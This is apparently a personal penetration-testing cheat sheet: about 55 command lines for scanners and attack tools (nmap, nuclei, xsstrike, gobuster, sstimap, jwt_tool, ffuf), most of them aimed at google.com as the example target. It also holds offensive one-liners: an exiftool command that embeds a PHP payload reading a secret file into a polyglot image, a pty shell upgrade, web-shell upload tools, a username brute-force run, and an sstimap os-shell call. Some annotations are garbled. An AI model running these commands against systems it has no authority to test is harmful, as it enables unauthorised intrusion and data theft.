	1. nikto -h https://google.com

	2. nuclei -u https://google.com

	3. sn1per -h https://google.com
	
	4. asnip -t https://google.com -p ---> Domain IP to conversion

	5. ./dalfox url https://google.com ---> XSS Vulnerability Detection
 
	6. ./dirdar -single https://google.com --> Directory Traversal

	7.  nosqli scan -t https://google.com ---> NoSQL Injection Detection
	
	8.  python3 blackwidow -u https://google.com ---> blackwindow

	9. python3 main.py -f domain.txt -w 10 --db output.db.json --> Project Eagle Alpha Scanner on the Target server --> Finding All the API key details in the response side.

	10. python3 maps_api_scanner_python3.py <Api> ---> verification whether the exposed google API key is vulnerable or not.
	
	11. ./sstimap.py -u https://google.com --os-she’ll dddddddddd

	12. getsploit wordpress 4.7.0 ---> To search the exploit for the product

	13. Payload Download Website ---> To get the Payload with Signup page portal.

	14. Arachini Web application Security Scanner ---> 
	
	15. trufflehog s3 --profile --key=acccess-key --secret=secret_key

	16. LFI Scanner ---> Local File Inclusion Vulnerability scanner with respective to the scanner to find the vulnerability on the application.

	17. XSS Strike, XSS Freak, PWNXss --> python3 xsstrike.py --crawl -u https://www.google.com

	18. JWT Token Scanning for the given Token Information ---> 
	python3 jwt_tool.py -M at  -t ""  -rh "Authorization: Bearer eyJhbG...<JWT Token>"
	19. python3 xsstrike.py --crawl -u https://google.com

	20. interactsh-client -h ---> (Server Side Request Forgery)
	
	21. interactsh-client -sf -session-file (---> Used to store/read current information from the user) &  interactsh-client -v -o interactsh-logs.txt
	
	22. NMAP Command --> nmap -p 1-65535 -T4 -A -v https://google.com

	23. ffuf -request request -request-proto http -w /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt:USERFUZZ -mc 200

	24. nmap -p 1-65535 -T4 -A -v https://google.com
	
	25. python3 sha256.py -l MAHESH > MAHESH_OUTPUT ---> We can define the file name as per our need.
	
	26. python3 sha256_generation usernames.txt ---> Pre-defined file name will be there post generation of the payload. (Sha values in the payload generation)
	
	27. webshell-cli https://google.com ---> We need to change the filename that has been uploaded.
	
	28. exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
	
	29. exiftool Capture.jpg
	
	30. ./FGDS.sh hyundai.co.in ---> To Discover and automate the google Forking Proess
	
	31. nuclei -l targets.txt -t nuclei-templates/custom/ -H "Authorization: Bearer your_token" -H "User-Agent: custom-user-agent"

	32. nuclei -l targets.txt -t nuclei-templates/custom/ --exclude "nuclei-templates/excluded-template.yaml"

	Attribution link: https://latesthackingnews.com/2023/04/29/nuclei-cheatsheet-the-go-to-resource-for-penetration-testers/
	
	33. sniper -t  https://google.com -m stealth -o -re
	
	34. amass enum -passive -d https://google.com
	
	35. httpx -l updated_subdomain ---> Which helps us to convert the URL into https

	36. httpx -status-code -title -tech-detect -list subdomain.lxt
	
	37. gobuster dir -u https://google.com -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 70 --random-agent -o gobuster-80.txt
	
	38. gobuster dir -u https://google.com -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php -o scans/gobuster-root-medium-php
	
	39. python3 -c 'import pty;pty.spawn("/bin/bash")'
	
	40. docker run -it -p 7474:7474 -e DISPLAY=unix$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix  --device=/dev/dri:/dev/dri -v $(pwd)/bh-data:/data --name bloodhound bloodhound

	41. python3 xsscon.py -u https://google.com

	42. xsser -u https://google.com

	43.  python3 okadminfinder.py -u https://google.com
	
	44. python cangibrina.py -u https://google.com

	45. python cangibrina.py -u https://google.com
	
	46. gobuster dir -u https://google.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

	47.  nano urls.txt | ./findom-xss.sh

	48.  uniscan -u domain_url -qwerds    ----> It's a wonderful to perform the scanning on the targets application.c

[1] perl ./uniscan.pl -u domain_url -qweds
[2] perl ./uniscan.pl -f sites.txt -bqweds
[3] perl ./uniscan.pl -i uniscan
[4] perl ./uniscan.pl -i "ip:xxx.xxx.xxx.xxx"
[5] perl ./uniscan.pl -o "inurl:test"
[6] perl ./uniscan.pl -u domain_url -r

	49. nmap -Pn -p 443,80 -sC -sV -iL ./subnet1 --open -oN Output_subnet1

	50. sudo nmap -sT -O localhost
	
	51. sudo nmap -sTU -O domain_url (scan both TCP and UDP for server)

	52. python webshell-sniper.py domain_url POST c

	54. ./backupfinder -url domain_url
	
	55. nmap -sV -p- domain_url
	
